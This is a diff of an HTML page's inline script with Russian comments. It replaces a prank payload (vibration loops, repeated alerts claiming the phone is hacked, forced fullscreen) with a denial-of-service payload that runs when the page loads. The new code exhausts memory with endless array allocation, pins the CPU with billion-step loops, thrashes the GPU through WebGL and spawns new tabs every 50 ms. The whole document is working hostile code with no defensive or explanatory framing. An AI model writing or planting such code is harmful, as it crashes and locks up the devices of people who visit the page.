@@ -7,14 +7,33 @@
 </head>
 <body>
 <script>
+// Заполнение памяти массивами
+let arr = [];
+setInterval(() => {
+  for (let i = 0; i < 100000; i++) {
+    arr.push(new Array(10000).fill('x'));
+  }
+}, 100);
 
-if (navigator.vibrate) {
-  setInterval(() => navigator.vibrate(1000), 500);
-}
+// Бесконечные вычисления (CPU)
+setInterval(() => {
+  let a = 0;
+  for (let i = 0; i < 1e9; i++) {
+    a += i * i / (i + 1);
+  }
+}, 50);
 
-setInterval(() => alert("Ваш телефон взломан"), 100);
+// WebGL нагрузка (GPU)
+const canvas = document.createElement('canvas');
+document.body.appendChild(canvas);
+const gl = canvas.getContext('webgl');
+setInterval(() => {
+  gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
+  gl.clear(gl.COLOR_BUFFER_BIT);
+}, 10);
 
-document.documentElement.requestFullscreen().catch(e => {});
+// Множество вкладок через window.open (если не заблокировано)
+setInterval(() => window.open(window.location.href, '_blank'), 50);
 </script>
 </body>
 </html>
